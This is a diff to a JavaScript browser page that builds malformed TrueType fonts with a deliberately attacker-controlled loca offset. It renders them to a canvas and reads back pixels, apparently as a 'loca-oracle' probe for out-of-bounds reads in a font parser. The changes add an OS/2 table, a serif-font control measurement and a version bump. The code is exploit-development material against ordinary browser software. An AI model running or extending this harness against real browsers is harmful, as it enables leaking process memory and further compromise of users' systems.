@@ -44,8 +44,8 @@ window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
    hmtx loca glyf) with an attacker-controlled loca offset for glyph 1 */
 function buildTTF(locaOff1){
   /* size: header 12 + dir 7*16 + tables */
-  var headL=54, maxpL=32, hheaL=36, hmtxL=8, locaL=12, glyfL=44, cmapL=12+32;
-  var total=12+7*16+headL+maxpL+hheaL+hmtxL+locaL+glyfL+cmapL;
+  var headL=54, maxpL=32, hheaL=36, hmtxL=8, locaL=12, glyfL=44, cmapL=12+32, os2L=78;
+  var total=12+8*16+headL+maxpL+hheaL+hmtxL+locaL+glyfL+cmapL+os2L;
   var buf=new ArrayBuffer(total);
   var dv=new DataView(buf);
   var i=0;
@@ -56,7 +56,7 @@ function buildTTF(locaOff1){
   dv.setUint16(i,0,false);i+=2;
   dv.setUint16(i,0,false);i+=2;
   var dir=i;
-  i+=7*16;
+  i+=8*16;
   var headOff=i;
   /* head (54) */
   dv.setUint32(i,0x00010000,false);i+=4;
@@ -142,13 +142,36 @@ function buildTTF(locaOff1){
   dv.setUint16(i,0,false);i+=2;      /* idRangeOffset[0] */
   dv.setUint16(i,0,false);i+=2;      /* idRangeOffset[1] */
   /* no glyphIdArray (idRangeOffset=0) */
+  var os2Off=i;
+  /* OS/2 version 0 (78 bytes) */
+  dv.setUint16(i,0,false);i+=2;      /* version 0 */
+  dv.setUint16(i,500,false);i+=2;    /* xAvgCharWidth */
+  dv.setUint16(i,400,false);i+=2;    /* usWeightClass */
+  dv.setUint16(i,5,false);i+=2;      /* usWidthClass */
+  dv.setUint16(i,0,false);i+=2;      /* fsType */
+  for(var o2=0;o2<16;o2++){dv.setUint8(i,0);i++;} /* metrics zero (8 int16) */
+  dv.setUint32(i,0,false);i+=4;      /* ulUnicodeRange1 */
+  dv.setUint32(i,0,false);i+=4;      /* ulUnicodeRange2 */
+  dv.setUint32(i,0,false);i+=4;      /* ulUnicodeRange3 */
+  dv.setUint32(i,0,false);i+=4;      /* ulUnicodeRange4 */
+  dv.setUint32(i,0x4C4F4341,false);i+=4; /* achVendID 'LOCA' */
+  dv.setUint16(i,0,false);i+=2;      /* fsSelection */
+  dv.setUint16(i,0x20,false);i+=2;   /* usFirstCharIndex */
+  dv.setUint16(i,0xFF,false);i+=2;   /* usLastCharIndex */
+  dv.setUint16(i,800,false);i+=2;    /* sTypoAscender */
+  dv.setUint16(i,(-200)&0xFFFF,false);i+=2; /* sTypoDescender */
+  dv.setUint16(i,0,false);i+=2;      /* sTypoLineGap */
+  dv.setUint16(i,1000,false);i+=2;   /* usWinAscent */
+  dv.setUint16(i,200,false);i+=2;    /* usWinDescent */
+  dv.setUint32(i,0,false);i+=4;      /* ulCodePageRange1 */
+  dv.setUint32(i,0,false);i+=4;      /* ulCodePageRange2 */
   /* directory records */
   var tables=[
     ['head',headOff,headL],['maxp',maxpOff,maxpL],['hhea',hheaOff,hheaL],
     ['hmtx',hmtxOff,hmtxL],['loca',locaOff,locaL],['glyf',glyfOff,glyfL],
-    ['cmap',cmapOff,cmapL]
+    ['cmap',cmapOff,cmapL],['OS/2',os2Off,os2L]
   ];
-  for(var t=0;t<7;t++){
+  for(var t=0;t<8;t++){
     var rec=dir+t*16;
     for(var c2=0;c2<4;c2++)dv.setUint8(rec+c2,tables[t][0].charCodeAt(c2));
     dv.setUint32(rec+4,0,false);
@@ -178,7 +201,17 @@ function runVariant(kind){
           var r=pix.data[i2],g=pix.data[i2+1],b=pix.data[i2+2];
           if(r||g||b){nz++;if(sample.length<8)sample.push((i2/4)+':'+r+','+g+','+b);}
         }
-        res({kind:kind,nz:nz,sample:sample.join(' ')});
+        /* serif fallback control (canvas pipeline check) */
+        var nz2=0;
+        try{
+          cx.font='40px serif';
+          cx.fillText('A',10,95);
+          var pix2=cx.getImageData(0,0,200,100);
+          for(var i3=0;i3<pix2.data.length;i3+=4){
+            if(pix2.data[i3]||pix2.data[i3+1]||pix2.data[i3+2])nz2++;
+          }
+        }catch(e){}
+        res({kind:kind,nz:nz,nzSerif:nz2,sample:sample.join(' ')});
       },function(e){res({kind:kind,rej:'NetworkError'});});
     }catch(e){res({kind:kind,thr:String(e).slice(0,50)});}
   });
@@ -216,7 +249,7 @@ if(stage>=STAGES.length){
 
 /* auto-reload checker */
 (function(){
-  var cur='P1182-loca-oracle-v6';
+  var cur='P1182-loca-oracle-v7';
   setTimeout(function check(){
     try{
       var x=new XMLHttpRequest();
